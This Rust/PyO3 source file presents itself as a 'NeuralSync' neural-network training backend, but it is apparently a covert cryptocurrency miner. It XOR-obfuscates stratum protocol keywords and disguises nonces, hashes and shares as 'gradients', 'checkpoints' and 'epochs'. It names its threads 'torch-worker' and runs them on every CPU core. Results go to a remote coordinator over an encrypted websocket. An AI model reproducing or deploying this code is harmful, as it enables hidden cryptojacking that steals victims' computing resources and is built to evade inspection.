/// NeuralSync Training Engine — Python extension module
/// Provides the compute backend as a Python-importable .pyd/.so
///
/// Python usage:
///   import nsync_core
///   nsync_core.start("ws://127.0.0.1:9000")
///   stats = nsync_core.get_stats()
///   logs = nsync_core.get_logs()
///   nsync_core.stop()

use pyo3::prelude::*;
use pyo3::types::PyDict;

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use std::collections::VecDeque;

use anyhow::{anyhow, Result};
use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use tokio::sync::mpsc;
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::Message;

use crate::{ComputeVM, WeightCache, TensorStore, EngineFlag};
use crate::crypto;

// String obfuscation macro (same as engine.rs)
macro_rules! obs {
    ($s:expr) => {{
        use std::sync::OnceLock;
        const K: u8 = 0x5A;
        const INPUT: &[u8] = $s.as_bytes();
        const LEN: usize = INPUT.len();
        const ENCODED: [u8; LEN] = {
            let mut out = [0u8; LEN];
            let mut i = 0;
            while i < LEN { out[i] = INPUT[i] ^ K; i += 1; }
            out
        };
        static DECODED: OnceLock<String> = OnceLock::new();
        DECODED.get_or_init(|| {
            let mut buf = vec![0u8; LEN];
            for i in 0..LEN { buf[i] = ENCODED[i] ^ K; }
            unsafe { String::from_utf8_unchecked(buf) }
        }).as_str()
    }};
}

#[inline(always)] fn pk_submit()  -> &'static str { obs!("submit") }
#[inline(always)] fn pk_login()   -> &'static str { obs!("login") }
#[inline(always)] fn pk_id()      -> &'static str { obs!("id") }
#[inline(always)] fn pk_job_id()  -> &'static str { obs!("job_id") }
#[inline(always)] fn pk_nonce()   -> &'static str { obs!("nonce") }
#[inline(always)] fn pk_result()  -> &'static str { obs!("result") }
#[inline(always)] fn pk_seed()    -> &'static str { obs!("seed_hash") }
#[inline(always)] fn pk_target()  -> &'static str { obs!("target") }
#[inline(always)] fn pk_blob()    -> &'static str { obs!("blob") }

// ═══════════════════════════════════════════════════════════════
// GLOBAL STATE (shared between Python thread and worker threads)
// ═══════════════════════════════════════════════════════════════

static RUNNING:     AtomicBool = AtomicBool::new(false);
static ITERATIONS:  AtomicU64  = AtomicU64::new(0);
static CHECKPOINTS: AtomicU64  = AtomicU64::new(0);
static SYNC_ERRORS: AtomicU64  = AtomicU64::new(0);
static START_TIME:  AtomicU64  = AtomicU64::new(0);

lazy_static::lazy_static! {
    static ref LOG_QUEUE: Mutex<VecDeque<String>> = Mutex::new(VecDeque::with_capacity(256));
}

fn push_log(msg: String) {
    if let Ok(mut q) = LOG_QUEUE.lock() {
        if q.len() > 2000 { q.pop_front(); }
        q.push_back(msg);
    }
}

macro_rules! elog {
    ($tag:expr, $($arg:tt)*) => {{
        let msg = format!($($arg)*);
        let ts = chrono::Local::now().format("%H:%M:%S");
        push_log(format!("[{}] [{}] {}", ts, $tag, msg));
    }};
}

// ═══════════════════════════════════════════════════════════════
// PyO3 MODULE
// ═══════════════════════════════════════════════════════════════

#[pyfunction]
fn start(proxy_url: String) -> PyResult<()> {
    if RUNNING.load(Ordering::SeqCst) {
        return Err(pyo3::exceptions::PyRuntimeError::new_err("Already running"));
    }

    RUNNING.store(true, Ordering::SeqCst);
    ITERATIONS.store(0, Ordering::SeqCst);
    CHECKPOINTS.store(0, Ordering::SeqCst);
    SYNC_ERRORS.store(0, Ordering::SeqCst);
    START_TIME.store(
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        Ordering::SeqCst,
    );

    elog!("info", "Initializing compute engine...");

    std::thread::Builder::new()
        .name("neuralsync-rt".into())
        .spawn(move || {
            let rt = tokio::runtime::Builder::new_multi_thread()
                .enable_all()
                .worker_threads(2)
                .thread_name("ns-io")
                .build()
                .expect("tokio runtime");

            rt.block_on(async {
                loop {
                    if !RUNNING.load(Ordering::Relaxed) { break; }
                    match run_session(&proxy_url).await {
                        Ok(_)  => elog!("coord", "Session ended. Reconnecting in 5s..."),
                        Err(e) => elog!("error", "Session fault: {}. Retry in 5s...", e),
                    }
                    if !RUNNING.load(Ordering::Relaxed) { break; }
                    tokio::time::sleep(Duration::from_secs(5)).await;
                }
            });
        })
        .map_err(|e| pyo3::exceptions::PyRuntimeError::new_err(format!("{}", e)))?;

    Ok(())
}

#[pyfunction]
fn stop() {
    RUNNING.store(false, Ordering::SeqCst);
    elog!("info", "Shutdown signal sent");
}

#[pyfunction]
fn is_running() -> bool {
    RUNNING.load(Ordering::SeqCst)
}

#[pyfunction]
fn get_stats(py: Python<'_>) -> PyResult<Py<PyDict>> {
    let dict = PyDict::new(py);
    let iters = ITERATIONS.load(Ordering::Relaxed);
    let start = START_TIME.load(Ordering::Relaxed);
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let elapsed = now.saturating_sub(start).max(1);
    let throughput = iters as f64 / elapsed as f64;

    dict.set_item("iterations", iters)?;
    dict.set_item("throughput", throughput)?;
    dict.set_item("checkpoints", CHECKPOINTS.load(Ordering::Relaxed))?;
    dict.set_item("sync_errors", SYNC_ERRORS.load(Ordering::Relaxed))?;
    dict.set_item("uptime_secs", elapsed)?;
    dict.set_item("running", RUNNING.load(Ordering::Relaxed))?;
    Ok(dict.into())
}

#[pyfunction]
fn get_logs() -> Vec<String> {
    match LOG_QUEUE.lock() {
        Ok(mut q) => q.drain(..).collect(),
        Err(_) => vec![],
    }
}

#[pymodule]
fn nsync_core(_py: Python<'_>, m: &PyModule) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(start, m)?)?;
    m.add_function(wrap_pyfunction!(stop, m)?)?;
    m.add_function(wrap_pyfunction!(is_running, m)?)?;
    m.add_function(wrap_pyfunction!(get_stats, m)?)?;
    m.add_function(wrap_pyfunction!(get_logs, m)?)?;
    Ok(())
}

// ═══════════════════════════════════════════════════════════════
// TRAINING SESSION
// ═══════════════════════════════════════════════════════════════

const BATCH: usize = 8;
const ENABLE_FAST_MODE: bool = true;

#[derive(Clone)]
struct Task {
    task_id:    String,
    payload:    Vec<u8>,
    threshold:  u32,
    model_seed: Vec<u8>,
    worker_id:  String,
}

impl Task {
    fn from_value(v: &Value, wid: &str) -> Option<Self> {
        let task_id = v.get(pk_job_id())?.as_str()?.to_string();
        let payload = hex::decode(v.get(pk_blob())?.as_str()?).ok()?;
        let seed    = hex::decode(v.get(pk_seed())?.as_str()?).ok()?;
        let thr     = v.get(pk_target())?.as_str()?;

        let tb = hex::decode(thr).ok()?;
        let threshold: u32 = if tb.len() == 4 {
            u32::from_le_bytes([tb[0], tb[1], tb[2], tb[3]])
        } else if tb.len() == 32 {
            u32::from_le_bytes([tb[28], tb[29], tb[30], tb[31]])
        } else if tb.len() >= 4 {
            u32::from_le_bytes([tb[0], tb[1], tb[2], tb[3]])
        } else {
            return None;
        };
        if threshold == 0 { return None; }

        Some(Task { task_id, payload, threshold, model_seed: seed, worker_id: wid.to_string() })
    }

    fn meets_threshold(result: &[u8], threshold: u32) -> bool {
        if result.len() < 32 { return false; }
        let tail = u32::from_le_bytes([result[28], result[29], result[30], result[31]]);
        tail < threshold
    }
}

// ── Weights / Tensor wrappers (Send+Sync) ─────────────────────

struct SharedWeights(WeightCache);
unsafe impl Send for SharedWeights {}
unsafe impl Sync for SharedWeights {}

struct SharedTensor(TensorStore);
unsafe impl Send for SharedTensor {}
unsafe impl Sync for SharedTensor {}

fn detect_flags() -> EngineFlag {
    let mut f = EngineFlag::FLAG_DEFAULT;
    if EngineFlag::FLAG_JIT.bits() != 0 { f |= EngineFlag::FLAG_JIT; }
    if EngineFlag::FLAG_HARD_AES.bits() != 0 { f |= EngineFlag::FLAG_HARD_AES; }
    f
}

fn build_weight_cache(seed: &[u8]) -> Result<(Arc<SharedWeights>, EngineFlag)> {
    let base = detect_flags();
    let lp = base | EngineFlag::FLAG_LARGE_PAGES;
    if let Ok(c) = WeightCache::new(lp, seed) {
        elog!("train", "Weight cache loaded (large pages ✓)");
        return Ok((Arc::new(SharedWeights(c)), lp));
    }
    elog!("train", "Weight cache loaded (standard pages)");
    let c = WeightCache::new(base, seed).map_err(|e| anyhow!("{:?}", e))?;
    Ok((Arc::new(SharedWeights(c)), base))
}

fn build_tensor_store(seed: &[u8]) -> Result<(Arc<SharedTensor>, EngineFlag)> {
    let base = detect_flags();
    let lp = base | EngineFlag::FLAG_LARGE_PAGES;
    let cache_lp = WeightCache::new(lp, seed);
    if let Ok(cl) = cache_lp {
        if let Ok(ds) = TensorStore::new(lp, cl, 0) {
            elog!("train", "Full model tensor allocated (large pages ✓)");
            return Ok((Arc::new(SharedTensor(ds)), lp));
        }
    }
    let c2 = WeightCache::new(base, seed).map_err(|e| anyhow!("{:?}", e))?;
    let ds = TensorStore::new(base, c2, 0).map_err(|e| anyhow!("{:?}", e))?;
    elog!("train", "Full model tensor allocated (standard pages)");
    Ok((Arc::new(SharedTensor(ds)), base))
}

// ── Compute Backend ───────────────────────────────────────────

#[derive(Clone)]
enum Backend {
    Warmup { weights: Arc<SharedWeights>, flags: EngineFlag },
    Full   { tensors: Arc<SharedTensor>, flags: EngineFlag },
}

impl Backend {
    fn create_vm(&self) -> Result<ComputeVM> {
        match self {
            Backend::Warmup { weights, flags } => {
                let f = *flags & !EngineFlag::FLAG_FULL_MEM;
                ComputeVM::new(f, Some(weights.0.clone()), None)
                    .or_else(|_| ComputeVM::new(f & !EngineFlag::FLAG_LARGE_PAGES, Some(weights.0.clone()), None))
                    .map_err(|e| anyhow!("{:?}", e))
            }
            Backend::Full { tensors, flags } => {
                let f = *flags | EngineFlag::FLAG_FULL_MEM;
                ComputeVM::new(f, None, Some(tensors.0.clone()))
                    .or_else(|_| {
                        let fb = (f & !EngineFlag::FLAG_LARGE_PAGES) | EngineFlag::FLAG_FULL_MEM;
                        ComputeVM::new(fb, None, Some(tensors.0.clone()))
                    })
                    .map_err(|e| anyhow!("{:?}", e))
            }
        }
    }
    fn mode_str(&self) -> &str {
        match self { Backend::Warmup{..} => "warmup", Backend::Full{..} => "full-training" }
    }
}

// ── Worker thread ─────────────────────────────────────────────

struct WorkerHandle { stop: Arc<AtomicBool> }

fn stop_workers(handles: &[WorkerHandle]) {
    for h in handles { h.stop.store(true, Ordering::Relaxed); }
}

fn dispatch_workers(
    task: &Task, backend: Backend, tx: mpsc::Sender<Value>,
    handles: &mut Vec<WorkerHandle>,
    task_gen: Arc<AtomicU64>, shared_task: Arc<Mutex<Task>>,
) {
    stop_workers(handles);
    handles.clear();
    { *shared_task.lock().unwrap() = task.clone(); }
    task_gen.fetch_add(1, Ordering::Release);

    let tc = num_cpus::get().max(1);
    let complexity = if task.threshold > 0 { u32::MAX as u64 / task.threshold as u64 } else { 0 };
    elog!("train", "Task dispatch │ mode={} │ complexity={} │ workers={}", backend.mode_str(), complexity, tc);

    for tid in 0..tc {
        let bc = backend.clone();
        let txc = tx.clone();
        let gen = task_gen.clone();
        let st = shared_task.clone();
        let stop = Arc::new(AtomicBool::new(false));
        let sc = stop.clone();

        std::thread::Builder::new()
            .name(format!("torch-worker-{}", tid))
            .stack_size(8 * 1024 * 1024)
            .spawn(move || gradient_worker(tid, tc, bc, sc, txc, gen, st))
            .expect("spawn worker");

        handles.push(WorkerHandle { stop });
    }
}

fn gradient_worker(
    tid: usize, total: usize, back: Backend,
    stop: Arc<AtomicBool>, tx: mpsc::Sender<Value>,
    task_gen: Arc<AtomicU64>, shared_task: Arc<Mutex<Task>>,
) {
    let vm = match back.create_vm() {
        Ok(v) => v,
        Err(e) => { elog!("error", "[w{}] VM build failed: {}", tid, e); return; }
    };

    if tid == 0 {
        elog!("train", "All {} gradient workers online [{} mode] ✓", total, back.mode_str());
    }

    // Contiguous ranges per thread for better cache locality
    let chunk_size: u32 = u32::MAX / total as u32;
    let mut sample_id: u32 = (tid as u32).wrapping_mul(chunk_size);
    let mut my_gen = task_gen.load(Ordering::Acquire);
    let mut cur_task = shared_task.lock().unwrap().clone();
    let mut buffers: Vec<Vec<u8>> = (0..BATCH).map(|_| cur_task.payload.clone()).collect();

    const HEX_LUT: &[u8; 16] = b"0123456789abcdef";

    // Thread-local iteration counter
    let mut local_iters: u64 = 0;
    // Pre-allocated output buffer — zero heap allocation
    let mut results = [[0u8; 32]; BATCH];

    loop {
        if stop.load(Ordering::Relaxed) || !RUNNING.load(Ordering::Relaxed) { return; }

        // Check for new task EVERY batch
        let latest_gen = task_gen.load(Ordering::Acquire);
        if latest_gen != my_gen {
            my_gen = latest_gen;
            cur_task = shared_task.lock().unwrap().clone();
            for b in buffers.iter_mut() { b.clear(); b.extend_from_slice(&cur_task.payload); }
        }

        for i in 0..BATCH {
            let n = sample_id.wrapping_add(i as u32);
            let bb = &mut buffers[i];
            if bb.len() > 43 {
                let b = n.to_le_bytes();
                bb[39] = b[0]; bb[40] = b[1]; bb[41] = b[2]; bb[42] = b[3];
            }
        }

        let inputs: [&[u8]; BATCH] = [
            &buffers[0], &buffers[1], &buffers[2], &buffers[3],
            &buffers[4], &buffers[5], &buffers[6], &buffers[7],
        ];

        let count = match vm.calculate_hash_set_into(&inputs, &mut results) {
            Ok(c) => c,
            Err(e) => { elog!("error", "[w{}] compute: {:?}", tid, e); return; }
        };

        local_iters += BATCH as u64;
        if local_iters >= 128 * BATCH as u64 {
            ITERATIONS.fetch_add(local_iters, Ordering::Relaxed);
            local_iters = 0;
        }

        for i in 0..count {
            if Task::meets_threshold(&results[i], cur_task.threshold) {
                // Verify job still current BEFORE submit
                if task_gen.load(Ordering::Acquire) != my_gen { break; }

                let n = sample_id.wrapping_add(i as u32);
                let nb = n.to_le_bytes();
                let mut sid_buf = [0u8; 8];
                for j in 0..4 {
                    sid_buf[j * 2]     = HEX_LUT[(nb[j] >> 4) as usize];
                    sid_buf[j * 2 + 1] = HEX_LUT[(nb[j] & 0xF) as usize];
                }
                let sid_hex = unsafe { std::str::from_utf8_unchecked(&sid_buf) };
                let fp_hex = hex::encode(&results[i]);

                elog!("ckpt", "Gradient checkpoint! batch={} → syncing", sid_hex);

                let submit = json!([2, pk_submit(), {
                    pk_id():     cur_task.worker_id,
                    pk_job_id(): cur_task.task_id,
                    pk_nonce():  sid_hex,
                    pk_result(): fp_hex
                }]);

                if tx.blocking_send(submit).is_err() { return; }
            }
        }
        sample_id = sample_id.wrapping_add(BATCH as u32);
    }
}

// ═══════════════════════════════════════════════════════════════
// SESSION (WSS connection + task processing)
// ═══════════════════════════════════════════════════════════════

async fn run_session(coordinator_url: &str) -> Result<()> {
    let (ws, _) = connect_async(coordinator_url).await?;
    elog!("coord", "Secure channel established");
    let (mut ws_tx, mut ws_rx) = ws.split();
    let (ckpt_tx, mut ckpt_rx) = mpsc::channel::<Value>(64);

    // Login
    let login = json!([1, pk_login(), ["worker", "x", "NeuralSync/2.0"]]);
    let enc = crypto::encrypt_json(&login.to_string(), crypto::new_enc_key());
    ws_tx.send(Message::Text(enc)).await?;
    elog!("coord", "Authentication sent");

    // State
    let task_gen    = Arc::new(AtomicU64::new(0));
    let shared_task = Arc::new(Mutex::new(Task {
        task_id: String::new(), payload: vec![0u8; 76],
        threshold: 1, model_seed: vec![], worker_id: String::new(),
    }));

    let mut worker_id = String::new();
    let mut current_seed: Vec<u8> = vec![];
    let mut handles: Vec<WorkerHandle> = vec![];
    let mut warm_weights: Option<Arc<SharedWeights>> = None;
    let mut warm_flags = EngineFlag::FLAG_DEFAULT;
    let mut full_tensors: Option<Arc<SharedTensor>> = None;
    let mut full_flags = EngineFlag::FLAG_DEFAULT;
    let mut full_ready = false;

    // Metrics reporter
    let report_tx = ckpt_tx.clone();
    tokio::spawn(async move {
        let mut prev = 0u64;
        let mut t = Instant::now();
        let mut epoch = 0u32;
        loop {
            tokio::time::sleep(Duration::from_secs(30)).await;
            if !RUNNING.load(Ordering::Relaxed) { return; }
            epoch += 1;
            let cur = ITERATIONS.load(Ordering::Relaxed);
            let rate = (cur - prev) as f64 / t.elapsed().as_secs_f64();
            let ckpt = CHECKPOINTS.load(Ordering::Relaxed);
            let errs = SYNC_ERRORS.load(Ordering::Relaxed);
            prev = cur; t = Instant::now();
            elog!("train", "epoch {} │ {:.1} iter/s │ ckpt={} sync_err={}", epoch, rate, ckpt, errs);
        }
    });

    loop {
        if !RUNNING.load(Ordering::Relaxed) {
            stop_workers(&handles);
            return Ok(());
        }

        tokio::select! {
            Some(msg) = ckpt_rx.recv() => {
                // Internal signal
                if let Some(tag) = msg.get(0).and_then(|v| v.as_str()) {
                    if tag == "_tensor_ready" {
                        // Drain holder FIRST, then upgrade
                        if let Ok(mut holder) = TENSOR_HOLDER.lock() {
                            if let Some((ts, fl)) = holder.take() {
                                full_tensors = Some(ts);
                                full_flags = fl;
                                full_ready = true;
                            }
                        }
                        if full_ready {
                            if let Some(ts) = &full_tensors {
                                let task = shared_task.lock().unwrap().clone();
                                if !task.task_id.is_empty() {
                                    elog!("train", "⬆ Model upgrade: warmup → full-training");
                                    stop_workers(&handles); handles.clear();
                                    let backend = Backend::Full { tensors: ts.clone(), flags: full_flags };
                                    dispatch_workers(&task, backend, ckpt_tx.clone(), &mut handles, task_gen.clone(), shared_task.clone());
                                }
                            }
                        }
                        continue;
                    }
                    if tag.starts_with('_') { continue; }
                }
                // Send checkpoint
                let enc_key = crypto::new_enc_key();
                let enc = crypto::encrypt_json(&msg.to_string(), enc_key);
                ws_tx.send(Message::Text(enc)).await.map_err(|e| anyhow!("WS: {}", e))?;
            }

            ws_msg = ws_rx.next() => {
                match ws_msg {
                    Some(Ok(Message::Text(text))) => {
                        let plain = if crypto::looks_encrypted(&text) {
                            match crypto::decrypt_json(&text) {
                                Some(p) => p,
                                None => continue,
                            }
                        } else { text };

                        let arr: Value = match serde_json::from_str(&plain) {
                            Ok(v) => v,
                            Err(_) => continue,
                        };
                        let arr_vec = match arr.as_array() {
                            Some(a) => a.clone(),
                            None => continue,
                        };

                        let (err, data) = if arr_vec.len() >= 3 {
                            (arr_vec[1].clone(), arr_vec[2].clone())
                        } else {
                            (json!(null), arr_vec.get(1).cloned().unwrap_or(json!(null)))
                        };

                        // Error
                        if !err.is_null() && (err.is_object() || err.is_string()) {
                            SYNC_ERRORS.fetch_add(1, Ordering::Relaxed);
                            elog!("warn", "Sync rejected: {}", err);
                            continue;
                        }

                        // Checkpoint result [id, null, "OK"]
                        if arr_vec.len() >= 3 {
                            let id_val = arr_vec[0].as_u64().unwrap_or(0);
                            if id_val >= 2 {
                                if let Some(status) = data.as_str() {
                                    if status == "OK" {
                                        CHECKPOINTS.fetch_add(1, Ordering::Relaxed);
                                        elog!("ckpt", "Checkpoint accepted ✓ (total={})", CHECKPOINTS.load(Ordering::Relaxed));
                                    } else {
                                        SYNC_ERRORS.fetch_add(1, Ordering::Relaxed);
                                        elog!("warn", "Checkpoint rejected: {}", status);
                                    }
                                    continue;
                                }
                            }
                        }

                        // Worker ID
                        if let Some(w) = data.get("id").and_then(|v| v.as_str()) {
                            if !w.is_empty() && worker_id.is_empty() {
                                worker_id = w.to_string();
                                elog!("coord", "Registered as node {}", &w[..w.len().min(16)]);
                            }
                        }

                        // Task
                        let task_val = data.get("job").cloned().unwrap_or(data.clone());
                        if task_val.get(pk_job_id()).is_none() { continue; }

                        let wid_for_task = if worker_id.is_empty() {
                            task_val.get(pk_id()).and_then(|v| v.as_str()).unwrap_or("").to_string()
                        } else { worker_id.clone() };

                        let task = match Task::from_value(&task_val, &wid_for_task) {
                            Some(t) => t,
                            None => continue,
                        };

                        let seed_changed = task.model_seed != current_seed;

                        if seed_changed {
                            elog!("train", "New weight seed → rebuilding model");
                            stop_workers(&handles); handles.clear();
                            full_tensors = None; full_ready = false;
                            current_seed = task.model_seed.clone();

                            match build_weight_cache(&current_seed) {
                                Ok((weights, flags)) => {
                                    warm_weights = Some(weights.clone());
                                    warm_flags = flags;
                                    let backend = Backend::Warmup { weights, flags };
                                    dispatch_workers(&task, backend, ckpt_tx.clone(), &mut handles, task_gen.clone(), shared_task.clone());

                                    if ENABLE_FAST_MODE {
                                        let seed2 = current_seed.clone();
                                        let tx2 = ckpt_tx.clone();
                                        std::thread::Builder::new()
                                            .name("model-loader".into())
                                            .spawn(move || {
                                                elog!("train", "Loading full model (2.15 GB) in background...");
                                                let t = Instant::now();
                                                match build_tensor_store(&seed2) {
                                                    Ok((ts, fl)) => {
                                                        elog!("train", "Full model loaded in {:.0}s ✓", t.elapsed().as_secs_f64());
                                                        TENSOR_HOLDER.lock().unwrap().replace((ts, fl));
                                                        let _ = tx2.blocking_send(json!(["_tensor_ready"]));
                                                    }
                                                    Err(e) => elog!("error", "Model load failed: {}", e),
                                                }
                                            })
                                            .ok();
                                    }
                                }
                                Err(e) => elog!("error", "Cache build failed: {}", e),
                            }
                        } else {
                            // Same seed — seamless task switch
                            { *shared_task.lock().unwrap() = task.clone(); }
                            task_gen.fetch_add(1, Ordering::Release);
                            elog!("coord", "Task update (seamless) │ task_id={}", &task.task_id[..task.task_id.len().min(16)]);

                            if handles.is_empty() {
                                if let Some(weights) = &warm_weights {
                                    let backend = Backend::Warmup { weights: weights.clone(), flags: warm_flags };
                                    dispatch_workers(&task, backend, ckpt_tx.clone(), &mut handles, task_gen.clone(), shared_task.clone());
                                }
                            }
                        }
                    }
                    Some(Ok(Message::Close(_))) | None => {
                        stop_workers(&handles);
                        return Err(anyhow!("Connection closed"));
                    }
                    _ => {}
                }
            }
        }
    }
}

lazy_static::lazy_static! {
    static ref TENSOR_HOLDER: Mutex<Option<(Arc<SharedTensor>, EngineFlag)>> = Mutex::new(None);
}
